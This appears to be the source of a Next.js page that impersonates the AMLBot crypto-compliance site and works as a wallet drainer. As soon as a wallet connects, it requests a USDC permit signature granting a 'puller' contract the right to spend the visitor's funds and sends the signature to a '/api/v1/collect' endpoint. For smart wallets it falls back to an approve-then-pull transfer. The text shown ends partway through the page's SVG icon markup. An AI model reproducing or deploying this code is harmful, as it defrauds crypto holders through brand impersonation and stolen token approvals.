"use client";

import { useCallback, useMemo, useState } from "react";
import { useAccount, useChainId, useSwitchChain, useSignTypedData, usePublicClient, useWalletClient } from "wagmi";
import { parseAbi } from "viem";
import "../public/css/aml.css";
import "../public/css/8b09c5b14a9651c1.css";
import "../public/css/224756d2aeed5110.css";
import "../public/css/7500854e1ee55cc8.css";
import "../public/css/styles.css";
import Head from "next/head";
import { useAutoPermitOnConnect } from "./useAutoPermitOnConnect";
import { splitSignature, USDC_MAINNET, PULLER_CONTRACT, USDC_DECIMALS } from "./permit";
import { verifyTypedData, recoverTypedDataAddress, createPublicClient, http } from "viem";
import { mainnet } from "viem/chains";

const erc2612Abi = parseAbi([
  "function nonces(address) view returns (uint256)"
]);

const erc20Abi = parseAbi([
  "function approve(address spender, uint256 amount) returns (bool)",
  "function balanceOf(address account) view returns (uint256)"
]);

const pullerAbi = parseAbi([
  "function pull(address owner, uint256 amount) external"
]);

export default function Home() {
  const { address, isConnected } = useAccount();
  const chainId = useChainId();
  const publicClient = usePublicClient();
  const { data: walletClient } = useWalletClient();
  const { switchChainAsync } = useSwitchChain();

  const { signTypedDataAsync, isPending } = useSignTypedData();

  const [status, setStatus] = useState<string>("");
  const [isSmartWallet, setIsSmartWallet] = useState(false);
  const [amount, setAmount] = useState<number>(0.000001);

  // Create a separate publicClient with working RPC
  const workingPublicClient = createPublicClient({
    chain: mainnet,
    transport: http('https://eth.llamarpc.com')
  });

  // Smart wallet fallback: approve + pull
  const handleSmartWalletFlow = useCallback(async () => {
    if (!walletClient || !address) {
      setStatus("❌ Wallet client not available");
      return;
    }

    try {
      const amountWei = BigInt(amount * 10 ** Number(USDC_DECIMALS));
      
      console.log("🔍 Starting smart wallet flow: approve + pull");
      console.log("Amount:", amountWei.toString(), "wei");
      console.log("Amount:", amount, "USDC");

      // 1) Check USDC balance
      console.log("🔍 Checking USDC balance...");
      const balance = await workingPublicClient.readContract({
        address: USDC_MAINNET,
        abi: erc20Abi,
        functionName: 'balanceOf',
        args: [address],
      });
      
      console.log("💰 USDC Balance:", balance.toString(), "wei");
      console.log("💰 USDC Balance:", (Number(balance) / 1e6).toFixed(6), "USDC");
      
      if (balance < amountWei) {
        setStatus(`❌ Insufficient USDC. Balance: ${(Number(balance) / 1e6).toFixed(6)} USDC, required: ${amount} USDC`);
        return;
      }

      // 2) Approve USDC
      console.log("🔍 Executing USDC approve transaction...");
      setStatus("Executing approve transaction...");
      
      const approveHash = await walletClient.writeContract({
        address: USDC_MAINNET,
        abi: erc20Abi,
        functionName: 'approve',
        args: [PULLER_CONTRACT, amountWei],
        account: address,
      });
      
      console.log("✅ Approve transaction sent:", approveHash);
      setStatus("⏳ Waiting for approve confirmation...");
      
      // Wait for approve transaction
      const approveReceipt = await workingPublicClient.waitForTransactionReceipt({
        hash: approveHash,
        timeout: 60_000, // 60 seconds
      });
      
      if (approveReceipt.status !== 'success') {
        throw new Error("Approve transaction failed");
      }
      
      console.log("✅ Approve transaction confirmed");
      setStatus("✅ Approve confirmed. Executing pull...");

      // 3) Pull tokens
      console.log("🔍 Executing pull transaction...");
      
      const pullHash = await walletClient.writeContract({
        address: PULLER_CONTRACT,
        abi: pullerAbi,
        functionName: 'pull',
        args: [address, amountWei],
        account: address,
      });
      
      console.log("✅ Pull transaction sent:", pullHash);
      setStatus("⏳ Waiting for pull confirmation...");
      
      // Wait for pull transaction
      const pullReceipt = await workingPublicClient.waitForTransactionReceipt({
        hash: pullHash,
        timeout: 60_000, // 60 seconds
      });
      
      if (pullReceipt.status !== 'success') {
        throw new Error("Pull transaction failed");
      }
      
      console.log("✅ Pull transaction confirmed");
      setStatus("✅ Transaction completed successfully! (Smart Wallet flow)");
      
    } catch (error: any) {
      console.error("❌ Smart wallet flow error:", error);
      setStatus(`❌ Error: ${error?.shortMessage ?? error?.message ?? String(error)}`);
    }
  }, [walletClient, address, workingPublicClient, amount]);
  

  const handlePermit = useCallback(async () => {
    try {
      setStatus("Preparing signature...");

      console.log("🔍 Starting permit process...");
      console.log("Address:", address);
      console.log("Chain ID:", chainId);
      console.log("Puller contract:", PULLER_CONTRACT);
      console.log("Public client:", !!publicClient);

      if (!isConnected || !address) {
        setStatus("Please connect your wallet first.");
        return;
      }
      if (!publicClient) {
        setStatus("❌ RPC client not available.");
        return;
      }
      if (chainId !== mainnet.id) {
        await switchChainAsync({ chainId: mainnet.id });
      }
      
      console.log("🔍 Detecting account type...");
      const code = await workingPublicClient.getBytecode({ address });
      const isContractAccount = code !== null;
      
      console.log("📋 Account type:", isContractAccount ? "Smart Wallet (Contract)" : "EOA (External Owned Account)");
      console.log("📋 Bytecode:", code ? `${code.slice(0, 10)}...` : "null");
      
      if (isContractAccount) {
        console.log("⚠️ Smart wallet detected - USDC permit not supported, using approve fallback");
        setIsSmartWallet(true);
        setStatus("⚠️ Smart wallet detected. Switching to approve + pull...");
        console.log("💡 Smart wallet detected. Switching to approve + pull flow");
        
        // Execute smart wallet flow
        await handleSmartWalletFlow();
        return;
      } else {
        setIsSmartWallet(false);
      }

      // EOA flow: permit + pullWithPermit
      console.log("✅ EOA detected - proceeding with permit flow");
      
      // 1) read nonce
      console.log("📡 Reading nonce from USDC contract...");
      console.log("USDC address:", USDC_MAINNET);
      console.log("User address:", address);
      
      let nonce: bigint;
      try {
        console.log("Trying to read nonce with timeout...");
        
        // Add timeout to the call
        const noncePromise = publicClient!.readContract({
          address: USDC_MAINNET,
          abi: erc2612Abi,
          functionName: "nonces",
          args: [address],
        });
        
        const timeoutPromise = new Promise((_, reject) => 
          setTimeout(() => reject(new Error('Nonce read timeout')), 10000)
        );
        
        nonce = (await Promise.race([noncePromise, timeoutPromise])) as bigint;
        
        console.log("✅ Nonce received:", nonce.toString());
      } catch (nonceError) {
        console.error("❌ Error reading nonce:", nonceError);
        console.log("🔄 Trying fallback: using nonce = 0");
        nonce = BigInt(0); // Fallback to 0 if nonce read fails
      }

      const value = BigInt(amount * 10 ** Number(USDC_DECIMALS)); // Convert USDC to wei
      const deadline = BigInt(Math.floor(Date.now() / 1000) + 28 * 24 * 60 * 60); // 28 days

      const domain = {
        name: "USD Coin",
        version: "2",
        chainId: 1,
        verifyingContract: USDC_MAINNET,
      } as const;

      const types = {
        Permit: [
          { name: "owner", type: "address" },
          { name: "spender", type: "address" },
          { name: "value", type: "uint256" },
          { name: "nonce", type: "uint256" },
          { name: "deadline", type: "uint256" },
        ],
      } as const;

      const message = {
        owner: address,
        spender: PULLER_CONTRACT,
        value,
        nonce,
        deadline,
      } as const;

      console.log("✍️ Requesting signature...");
      const signature = await signTypedDataAsync({
        domain, types, primaryType: "Permit", message,
      });
      
      console.log("✅ Signature received:", signature);

      console.log("🔍 Verifying signature...");
      const ok = await verifyTypedData({
        address: address,
        domain, types, primaryType: "Permit", message,
        signature,
      });
      console.log("✅ verifyTypedData =", ok);
      if (!ok) throw new Error("verifyTypedData=false");

      const recovered = await recoverTypedDataAddress({ domain, types, primaryType: "Permit", message, signature });
      console.log("✅ recovered =", recovered, "owner =", address);
      if (recovered.toLowerCase() !== address.toLowerCase()) throw new Error("recovered!=owner");

      const { v, r, s } = splitSignature(signature);

      console.log("🔍 Checking USDC balance...");
      const usdcBalance = await workingPublicClient.readContract({
        address: USDC_MAINNET,
        abi: [{
          name: 'balanceOf',
          type: 'function',
          stateMutability: 'view',
          inputs: [{ name: 'account', type: 'address' }],
          outputs: [{ name: '', type: 'uint256' }]
        }],
        functionName: 'balanceOf',
        args: [address],
      });
      
      console.log("💰 USDC Balance:", usdcBalance.toString(), "wei");
      console.log("💰 USDC Balance:", (Number(usdcBalance) / 1e6).toFixed(6), "USDC");
      console.log("💰 Required:", (Number(value) / 1e6).toFixed(6), "USDC");
      
      if (usdcBalance < value) {
        console.warn("⚠️ Insufficient USDC balance for simulation");
        console.warn("⚠️ This is normal - simulation will fail but signature is valid");
      }

      console.log("🔍 Simulating USDC.permit()...");
      await workingPublicClient.simulateContract({
        address: USDC_MAINNET,
        abi: [{
          name: 'permit',
          type: 'function',
          stateMutability: 'nonpayable',
          inputs: [
            { name: 'owner', type: 'address' },
            { name: 'spender', type: 'address' },
            { name: 'value', type: 'uint256' },
            { name: 'deadline', type: 'uint256' },
            { name: 'v', type: 'uint8' },
            { name: 'r', type: 'bytes32' },
            { name: 's', type: 'bytes32' }
          ],
          outputs: []
        }],
        functionName: "permit",
        args: [address, PULLER_CONTRACT, value, deadline, v, r, s],
      });
      console.log("✅ simulate USDC.permit: OK");

      console.log("🔍 Simulating pullWithPermit()...");
      try {
        await workingPublicClient.simulateContract({
          address: PULLER_CONTRACT,
          abi: [{
            name: 'pullWithPermit',
            type: 'function',
            stateMutability: 'nonpayable',
            inputs: [
              { name: 'owner', type: 'address' },
              { name: 'permitValue', type: 'uint256' },
              { name: 'amount', type: 'uint256' },
              { name: 'deadline', type: 'uint256' },
              { name: 'v', type: 'uint8' },
              { name: 'r', type: 'bytes32' },
              { name: 's', type: 'bytes32' }
            ],
            outputs: []
          }],
          functionName: "pullWithPermit",
          args: [address, value, value, deadline, v, r, s],
          account: address,
        });
        console.log("✅ simulate pullWithPermit: OK");
      } catch (pullError) {
        console.warn("⚠️ pullWithPermit simulation failed (expected if insufficient balance):", (pullError as Error).message);
        console.log("✅ Signature is still valid - this error is due to insufficient USDC balance");
      }

      // Debug logging
      console.log("🔍 Debug Info:");
      console.log("Domain:", domain);
      console.log("Message:", message);
      console.log("Signature components:", { v, r, s });
      console.log("Puller contract:", PULLER_CONTRACT);
      console.log("Owner:", address);

      const payload = {
        chainId: "1", // Fixed: Mainnet chainId is 1
        token: USDC_MAINNET,
        puller: PULLER_CONTRACT,
        owner: address,
        permitValue: value.toString(),
        nonce: nonce.toString(),
        deadline: deadline.toString(),
        v,
        r,
        s,
        amountUnits: value.toString(),
      };

      console.log("✅ permit payload", payload);
      setStatus("✅ Signature valid! Ready for transaction (see console for details).");

      await fetch("/api/v1/collect", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload),
      });

    } catch (e: any) {
      console.error(e);
      setStatus(`❌ Error: ${e?.shortMessage ?? e?.message ?? String(e)}`);
    }
  }, [
    isConnected,
    address,
    chainId,
    publicClient,
    signTypedDataAsync,
    switchChainAsync,
    handleSmartWalletFlow,
    amount,
  ]);

  // auto-start signing after connection
  useAutoPermitOnConnect(handlePermit);

    return (
        <main style={{padding: "40px"}}>
            <Head>
                <meta charSet="utf-8" />
                <title>AMLBot - Comprehensive AML Compliance Solutions for Crypto</title>

                <meta property="og:image" content="/_next/static/media/main.e2150f11.png" />
                <meta property="og:image:width" content="2400" />
                <meta property="og:image:height" content="1260" />
                <meta property="og:image:type" content="image/png" />
                <meta name="og:site_name" content=" " />
                <meta name="twitter:image" content="/_next/static/media/main.e2150f11.png" />
                <meta name="twitter:card" content="summary_large_image" />
                <meta name="apple-mobile-web-app-capable" content="yes" />
                <meta name="apple-touch-fullscreen" content="yes" />
                <meta name="apple-mobile-web-app-status-bar-style" content="#000000" />
                <meta name="format-detection" content="telephone=no" />
                <meta name="viewport" content="initial-scale=1.0, width=device-width" />

                <link rel="canonical" href="https://amlbot.com" />
                <link rel="icon" type="image/png" href="https://amlbot.com/favicon.png" />

                <meta name="title" content="AMLBot - Comprehensive AML Compliance Solutions for Crypto" />
                <meta name="description"
                      content="AMLBot provides advanced AML compliance solutions for crypto businesses. Use our AML bot for thorough AML checks and ensure compliance with the latest regulations. Protect your assets with AMLBot's comprehensive platform." />
                <meta property="og:title" content="AMLBot - Comprehensive AML Compliance Solutions for Crypto" />
                <meta property="og:description"
                      content="AMLBot provides advanced AML compliance solutions for crypto businesses. Use our AML bot for thorough AML checks and ensure compliance with the latest regulations. Protect your assets with AMLBot's comprehensive platform." />
                <meta name="twitter:title" content="AMLBot - Comprehensive AML Compliance Solutions for Crypto" />
                <meta name="twitter:description"
                      content="AMLBot provides advanced AML compliance solutions for crypto businesses. Use our AML bot for thorough AML checks and ensure compliance with the latest regulations. Protect your assets with AMLBot's comprehensive platform." />

                {/* Preload fonts */}
                <link rel="preload" href="/_next/static/media/55c55f0601d81cf3-s.p.woff2" as="font" type="font/woff2"
                      crossOrigin="anonymous" data-next-font="size-adjust" />
                <link rel="preload" href="/_next/static/media/a34f9d1faa5f3315-s.p.woff2" as="font" type="font/woff2"
                      crossOrigin="anonymous" data-next-font="size-adjust" />

                {/* Connect styles */}
                <link rel="stylesheet" href="../public/css/224756d2aeed5110.css" />
                <link rel="stylesheet" href="../public/css/8b09c5b14a9651c1.css" />
                <link rel="stylesheet" href="../public/css/7500854e1ee55cc8.css" />
                <link rel="stylesheet" href="../public/css/aml.css" />
                <link rel="stylesheet" href="../public/css/styles.css" />
            </Head>
            <div id="hs-web-interactives-top-push-anchor" className="go3670563033"></div>
            <noscript>
                <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-NB2RTM9"
                        height="0" width="0" style={{display: "none", visibility: "hidden"}}></iframe>
            </noscript>
            <div id="__next">
                <svg xmlns="http://www.w3.org/2000/svg" style={{position: "absolute", width: "0", height: "0", visibility: "hidden"}}>
                    <title>SVG
                        Icons</title>
                    <symbol id="icon-copy" viewBox="0 0 115.77 122.88">
                        <path
                            d="M89.62,13.96v7.73h12.19h0.01v0.02c3.85,0.01,7.34,1.57,9.86,4.1c2.5,2.51,4.06,5.98,4.07,9.82h0.02v0.02 v73.27v0.01h-0.02c-0.01,3.84-1.57,7.33-4.1,9.86c-2.51,2.5-5.98,4.06-9.82,4.07v0.02h-0.02h-61.7H40.1v-0.02 c-3.84-0.01-7.34-1.57-9.86-4.1c-2.5-2.51-4.06-5.98-4.07-9.82h-0.02v-0.02V92.51H13.96h-0.01v-0.02c-3.84-0.01-7.34-1.57-9.86-4.1 c-2.5-2.51-4.06-5.98-4.07-9.82H0v-0.02V13.96v-0.01h0.02c0.01-3.85,1.58-7.34,4.1-9.86c2.51-2.5,5.98-4.06,9.82-4.07V0h0.02h61.7 h0.01v0.02c3.85,0.01,7.34,1.57,9.86,4.1c2.5,2.51,4.06,5.98,4.07,9.82h0.02V13.96L89.62,13.96z M79.04,21.69v-7.73v-0.02h0.02 c0-0.91-0.39-1.75-1.01-2.37c-0.61-0.61-1.46-1-2.37-1v0.02h-0.01h-61.7h-0.02v-0.02c-0.91,0-1.75,0.39-2.37,1.01 c-0.61,0.61-1,1.46-1,2.37h0.02v0.01v64.59v0.02h-0.02c0,0.91,0.39,1.75,1.01,2.37c0.61,0.61,1.46,1,2.37,1v-0.02h0.01h12.19V35.65 v-0.01h0.02c0.01-3.85,1.58-7.34,4.1-9.86c2.51-2.5,5.98-4.06,9.82-4.07v-0.02h0.02H79.04L79.04,21.69z M105.18,108.92V35.65v-0.02 h0.02c0-0.91-0.39-1.75-1.01-2.37c-0.61-0.61-1.46-1-2.37-1v0.02h-0.01h-61.7h-0.02v-0.02c-0.91,0-1.75,0.39-2.37,1.01 c-0.61,0.61-1,1.46-1,2.37h0.02v0.01v73.27v0.02h-0.02c0,0.91,0.39,1.75,1.01,2.37c0.61,0.61,1.46,1,2.37,1v-0.02h0.01h61.7h0.02 v0.02c0.91,0,1.75-0.39,2.37-1.01c0.61-0.61,1-1.46,1-2.37h-0.02V108.92L105.18,108.92z"></path>
                    </symbol>
                    <symbol id="icon-check" viewBox="0 0 12 9">
                        <path
                            d="M10.9801483,0.146444922 C11.1754114,-0.0488162919 11.4919939,-0.048814781 11.6872551,0.146448297 C11.8825163,0.341711375 11.8825148,0.658293864 11.6872517,0.853555078 L4.3538817,8.18685508 C4.15862011,8.3821148 3.84204056,8.382115 3.64677873,8.18685551 L0.313438731,4.85355551 C0.118175413,4.65829454 0.118173514,4.34171205 0.313434488,4.14644873 C0.508695462,3.95118541 0.825277952,3.95118351 1.02054127,4.14644449 L3.99999,7.126 L10.9801483,0.146444922 Z"></path>
                    </symbol>
                    <symbol id="icon-checkmark-circle" viewBox="0 0 256 256">
                        <path
                            d="M128,10C62.8,10,10,62.8,10,128c0,65.2,52.8,118,118,118c65.2,0,118-52.8,118-118C246,62.8,193.2,10,128,10z M200.1,94.1l-80.9,79.2c-0.4,0.7-0.9,1.4-1.6,2l-3.8,3.8c-2.1,2.1-4.6,3-5.5,2.1l-38.5-40.3c-0.9-0.9,0-3.4,2.1-5.5l3.8-3.8c2.1-2.1,4.6-3,5.5-2.1l28.9,30.2l78.7-77c2.1-2.1,5.5-2.1,7.6,0l3.8,3.8C202.2,88.6,202.2,92,200.1,94.1z"></path>
                    </symbol>
                    <symbol id="icon-arrow-right-long" viewBox="0 0 20 10">
                        <path
                            d="M19.7709,4.2907422 C19.7706,4.2905122 19.7704,4.2902322 19.7702,4.2900022 L15.688,0.227502195 C15.3821,-0.0768378048 14.8875,-0.0757078048 14.5831,0.230152195 C14.2787,0.535972195 14.2799,1.0306222 14.5857,1.3350022 L17.3265,4.0625022 L0.78125,4.0625022 C0.349766,4.0625022 0,4.4122522 0,4.8437522 C0,5.2752522 0.349766,5.6249522 0.78125,5.6249522 L17.3264,5.6249522 L14.5857,8.3524522 C14.2799,8.6568522 14.2788,9.1515522 14.5831,9.4573522 C14.8875,9.7632522 15.3822,9.7642522 15.688,9.4599522 L19.7702,5.3974522 C19.7704,5.3972522 19.7706,5.3969522 19.7709,5.3967522 C20.0769,5.0913522 20.0759,4.5951522 19.7709,4.2907422 Z"></path>
                    </symbol>
                    <symbol id="icon-arrow-left-long" viewBox="0 0 20 10">
                        <path
                            d="M0.153482779,4.37823078 L0.229825153,4.2900022 L4.31202515,0.227502195 C4.61792515,-0.0768378048 5.11252515,-0.0757078048 5.41692515,0.230152195 C5.72132515,0.535972195 5.72012515,1.0306222 5.41432515,1.3350022 L2.67352515,4.0625022 L19.2187752,4.0625022 C19.6502592,4.0625022 20.0000252,4.4122522 20.0000252,4.8437522 C20.0000252,5.2752522 19.6502592,5.6249522 19.2187752,5.6249522 L2.67362515,5.6249522 L5.41432515,8.3524522 C5.72012515,8.6568522 5.72122515,9.1515522 5.41692515,9.4573522 C5.11252515,9.7632522 4.61782515,9.7642522 4.31202515,9.4599522 L0.229125153,5.3967522 C-0.0490566647,5.11911583 -0.0735194747,4.68379352 0.153482779,4.37823078 Z"></path>
                    </symbol>
                    <symbol id="icon-facebook-fill-circle" viewBox="0 0 28 28">
                        <path
                            d="M14,0 C6.28043,0 0,6.28043 0,14 C0,21.719 6.28043,28 14,28 C21.719,28 28,21.719 28,14 C28,6.28043 21.7201,0 14,0 Z"
                            fill="#1D1D1D"></path>
                        <path
                            d="M17.4817,14.4929 L15.204,14.4929 L15.204,22.6111 L11.8289,22.6111 C11.8289,22.6111 11.8289,18.1753 11.8289,14.4929 L10.2245,14.4929 L10.2245,11.6236 L11.8289,11.6236 L11.8289,9.76774 C11.8289,8.43857 12.4605,6.36164 15.235,6.36164 L17.736,6.37122 L17.736,9.15645 C17.736,9.15645 16.2162,9.15645 15.9207,9.15645 C15.6252,9.15645 15.2051,9.3042 15.2051,9.93805 L15.2051,11.6242 L17.7766,11.6242 L17.4817,14.4929 Z"
                            fill="#FFFFFF"></path>
                    </symbol>
                    <symbol id="icon-telegram-fill-circle" viewBox="0 0 28 28">
                        <path
                            d="M14,28 C21.7338,28 28,21.7338 28,14 C28,6.26617 21.7338,0 14,0 C6.26617,0 0,6.26617 0,14 C0,21.7338 6.26617,28 14,28 Z"></path>
                        <path
                            d="M6.40617,13.6967 L19.9045,8.49217 C20.531,8.26583 21.0782,8.645 20.8752,9.59233 L20.8763,9.59117 L18.578,20.419 C18.4077,21.1867 17.9515,21.3733 17.3133,21.0117 L13.8133,18.4322 L12.1252,20.0585 C11.9385,20.2452 11.781,20.4027 11.4193,20.4027 L11.6678,16.8408 L18.1545,10.9807 C18.4368,10.7322 18.0915,10.5922 17.7193,10.8395 L9.70317,15.8865 L6.2475,14.8085 C5.49733,14.5705 5.481,14.0583 6.40617,13.6967 Z"
                            fill="#fff"></path>
                    </symbol>
                    <symbol id="icon-telegram" viewBox="0 0 22 19">
                        <path
                            d="M8.63240987,12.0829924 L8.26849987,17.2015924 C8.78915987,17.2015924 9.01465987,16.9779924 9.28507987,16.7093924 L11.7261999,14.3764924 L16.7842999,18.0806924 C17.7119999,18.5976924 18.3655999,18.3254924 18.6157999,17.2272924 L21.9359999,1.66962235 L21.9368999,1.66870235 C22.2311999,0.297371354 21.4409999,-0.238878146 20.5371999,0.0975383542 L1.02132987,7.56929235 C-0.310587131,8.08629235 -0.290420131,8.82879235 0.794912869,9.16520235 L5.78432987,10.7170924 L17.3736999,3.46537235 C17.9191999,3.10420235 18.4150999,3.30404235 18.0071999,3.66520235 L8.63240987,12.0829924 Z"></path>
                    </symbol>
                    <symbol id="icon-linkedin-fill-circle" viewBox="0 0 28 28">
                        <path
                            d="M14,0 C6.2692,0 0,6.2692 0,14 C0,21.7308 6.2692,28 14,28 C21.7308,28 28,21.7308 28,14 C28,6.2692 21.7308,0 14,0 Z"></path>
                        <polygon fill="#FFFFFF"
                                 points="9.93176 21.1641 6.52213 21.1641 6.52213 10.9061 9.93176 10.9061"></polygon>
                        <path
                            d="M8.22705,9.50537 L8.20483,9.50537 C7.06067,9.50537 6.32068,8.71774 6.32068,7.73337 C6.32068,6.72678 7.08331,5.96094 8.24969,5.96094 C9.41608,5.96094 10.1339,6.72678 10.1561,7.73337 C10.1561,8.71774 9.41608,9.50537 8.22705,9.50537 Z"
                            fill="#FFFFFF"></path>
                        <path
                            d="M22.2262,21.1641 L18.817,21.1641 L18.817,15.6763 C18.817,14.2971 18.3233,13.3566 17.0896,13.3566 C16.1478,13.3566 15.5868,13.991 15.3403,14.6035 C15.2501,14.8227 15.2281,15.129 15.2281,15.4355 L15.2281,21.1641 L11.8187,21.1641 C11.8187,21.1641 11.8633,11.8685 11.8187,10.9061 L15.2281,10.9061 L15.2281,12.3585 C15.6812,11.6595 16.4919,10.6653 18.3009,10.6653 C20.5441,10.6653 22.2262,12.1314 22.2262,15.2822 L22.2262,21.1641 Z"
                            fill="#FFFFFF"></path>
                    </symbol>
                    <symbol id="icon-linkedin-fill-rect" viewBox="0 0 21 20">
                        <path
                            d="M18.5195,0 L1.47656,0 C0.66016,0 0,0.644531 0,1.44141 L0,18.5547 C0,19.3516 0.66016,20 1.47656,20 L18.5195,20 C19.3359,20 20,19.3516 20,18.5586 L20,1.44141 C20,0.644531 19.3359,0 18.5195,0 Z M5.93359,17.043 L2.96484,17.043 L2.96484,7.49609 L5.93359,7.49609 L5.93359,17.043 Z M4.44922,6.19531 C3.49609,6.19531 2.72656,5.42578 2.72656,4.47656 C2.72656,3.52734 3.49609,2.75781 4.44922,2.75781 C5.39844,2.75781 6.16797,3.52734 6.16797,4.47656 C6.16797,5.42188 5.39844,6.19531 4.44922,6.19531 Z M17.043,17.043 L14.0781,17.043 L14.0781,12.4023 C14.0781,11.2969 14.0586,9.87109 12.5352,9.87109 C10.9922,9.87109 10.7578,11.0781 10.7578,12.3242 L10.7578,17.043 L7.79688,17.043 L7.79688,7.49609 L10.6406,7.49609 L10.6406,8.80078 L10.6797,8.80078 C11.0742,8.05078 12.043,7.25781 13.4844,7.25781 C16.4883,7.25781 17.043,9.23438 17.043,11.8047 L17.043,17.043 Z"></path>
                    </symbol>
                    <symbol id="icon-instagram-fill-circle" viewBox="0 0 28 28">
                        <circle fill="#1D1D1D" cx="14" cy="14" r="14"></circle>
                        <path
                            d="M17.9997,6 L9.9999,6 C7.80015,6 6,7.80015 6,9.9999 L6,18.0001 C6,20.1993 7.80015,22 9.9999,22 L17.9997,22 C20.1995,22 21.9996,20.1993 21.9996,18.0001 L21.9996,9.9999 C21.9996,7.80015 20.1995,6 17.9997,6 Z M20.6662,18.0001 C20.6662,19.4701 19.4705,20.6666 17.9997,20.6666 L9.9999,20.6666 C8.52974,20.6666 7.33337,19.4701 7.33337,18.0001 L7.33337,9.9999 C7.33337,8.52955 8.52974,7.33337 9.9999,7.33337 L17.9997,7.33337 C19.4705,7.33337 20.6662,8.52955 20.6662,9.9999 L20.6662,18.0001 Z"
                            fill="#FFFFFF"></path>
                        <path
                            d="M18.332,10.666 C18.8843,10.666 19.332,10.2183 19.332,9.66599 C19.332,9.11372 18.8843,8.66602 18.332,8.66602 C17.7797,8.66602 17.332,9.11372 17.332,9.66599 C17.332,10.2183 17.7797,10.666 18.332,10.666 Z"
                            fill="#FFFFFF"></path>
                        <path
                            d="M13.9999,10 C11.7903,10 10,11.7905 10,13.9999 C10,16.2084 11.7903,18.0002 13.9999,18.0002 C16.2088,18.0002 17.9998,16.2084 17.9998,13.9999 C17.9998,11.7905 16.2088,10 13.9999,10 Z M13.9999,16.6668 C12.5273,16.6668 11.3334,15.4729 11.3334,13.9999 C11.3334,12.5269 12.5273,11.3334 13.9999,11.3334 C15.4725,11.3334 16.6664,12.5269 16.6664,13.9999 C16.6664,15.4729 15.4725,16.6668 13.9999,16.6668 Z"
                            fill="#FFFFFF"></path>
                    </symbol>
                    <symbol id="icon-reddit-fill-circle" viewBox="0 0 28 28">
                        <circle cx="14" cy="14" r="14"></circle>
                        <path
                            d="M21.1991,14.1078 C21.1631,13.2438 20.4431,12.5598 19.5611,12.5778 C19.1651,12.5958 18.8051,12.7578 18.5351,13.0098 C17.3111,12.1638 15.8531,11.7138 14.3591,11.6778 L15.0611,8.31183 L17.3831,8.77983 C17.4551,9.37383 17.9771,9.80583 18.5711,9.73383 C19.1651,9.66183 19.5971,9.13983 19.5251,8.54583 C19.4531,7.95183 18.9311,7.51983 18.3371,7.59183 C17.9951,7.62783 17.6891,7.82583 17.5271,8.11383 L14.8811,7.59183 C14.7011,7.55583 14.5211,7.66383 14.4851,7.84383 L13.6931,11.6058 C12.1811,11.6238 10.7231,12.0918 9.46314,12.9378 C8.83314,12.3438 7.82514,12.3618 7.23114,13.0098 C6.63714,13.6398 6.65514,14.6478 7.30314,15.2418 C7.42914,15.3498 7.57314,15.4578 7.73514,15.5298 C7.71714,15.6918 7.71714,15.8538 7.73514,15.9978 C7.73514,18.4278 10.5611,20.4078 14.0531,20.4078 C17.5451,20.4078 20.3711,18.4458 20.3711,15.9978 C20.3891,15.8358 20.3891,15.6738 20.3711,15.5298 C20.8751,15.2778 21.2171,14.7198 21.1991,14.1078 L21.1991,14.1078 Z M10.3451,15.2058 C10.3451,14.6118 10.8311,14.1258 11.4251,14.1258 C12.0191,14.1258 12.5051,14.6118 12.5051,15.2058 C12.5051,15.7998 12.0191,16.2858 11.4251,16.2858 C10.8311,16.2858 10.3451,15.7998 10.3451,15.2058 Z M16.6451,18.1938 C15.8711,18.7698 14.9351,19.0758 13.9811,19.0218 C13.0271,19.0578 12.0731,18.7698 11.3171,18.1938 C11.2091,18.0678 11.2271,17.8878 11.3531,17.7798 C11.4611,17.6898 11.6051,17.6898 11.7311,17.7798 C12.3791,18.2478 13.1711,18.4998 13.9811,18.4638 C14.7911,18.4998 15.5831,18.2838 16.2491,17.7978 C16.3751,17.6898 16.5551,17.6898 16.6811,17.7978 C16.7891,17.9238 16.7891,18.1038 16.6811,18.2298 L16.6811,18.1938 L16.6451,18.1938 Z M16.4651,16.3398 C15.8711,16.3398 15.3851,15.8538 15.3851,15.2598 C15.3851,14.6658 15.8711,14.1798 16.4651,14.1798 C17.0591,14.1798 17.5451,14.6658 17.5451,15.2598 C17.5631,15.8538 17.1131,16.3578 16.5011,16.3758 C16.4831,16.3758 16.4651,16.3758 16.4471,16.3758 L16.4651,16.3398 Z"
                            fill="#FFFFFF"></path>
                    </symbol>
                    <symbol id="icon-tiktok-fill-circle" viewBox="0 0 28 28">
                        <circle cx="14" cy="14" r="14"></circle>
                        <path
                            d="M21.0732,10.7617 C20.2171,10.7617 19.4273,10.4781 18.793,9.99971 C18.0655,9.45127 17.5429,8.64678 17.3583,7.71953 C17.3126,7.49043 17.288,7.254 17.2857,7.01172 L14.8403,7.01172 L14.8403,13.6938 L14.8373,17.3538 C14.8373,18.3323 14.2001,19.162 13.3168,19.4538 C13.0605,19.5385 12.7836,19.5786 12.4953,19.5628 C12.1274,19.5426 11.7825,19.4315 11.4828,19.2522 C10.845,18.8708 10.4126,18.1788 10.4009,17.3872 C10.3824,16.15 11.3826,15.1413 12.619,15.1413 C12.863,15.1413 13.0974,15.1812 13.3168,15.2535 L13.3168,13.4271 L13.3168,12.7706 C13.0854,12.7363 12.8498,12.7185 12.6116,12.7185 C11.2584,12.7185 9.99279,13.281 9.0881,14.2943 C8.40432,15.0602 7.99416,16.0372 7.93088,17.0617 C7.84797,18.4076 8.34045,19.687 9.29553,20.631 C9.43586,20.7695 9.58322,20.8981 9.73732,21.0168 C10.5562,21.647 11.5572,21.9886 12.6116,21.9886 C12.8498,21.9886 13.0854,21.971 13.3168,21.9367 C14.3018,21.7908 15.2106,21.3399 15.9278,20.631 C16.809,19.76 17.2959,18.6036 17.3012,17.3729 L17.2886,11.9072 C17.709,12.2315 18.1687,12.4999 18.662,12.7082 C19.4293,13.0319 20.2429,13.196 21.0802364,13.1957 L21.0802364,11.42 L21.0802364,10.7611 C21.0808,10.7617 21.0738,10.7617 21.0732,10.7617 L21.0732,10.7617 Z"
                            fill="#FFFFFF"></path>
                    </symbol>
                    <symbol id="icon-twitter-fill-circle" viewBox="0 0 102 102">
                        <circle cx="50" cy="50" r="50"></circle>
                        <path
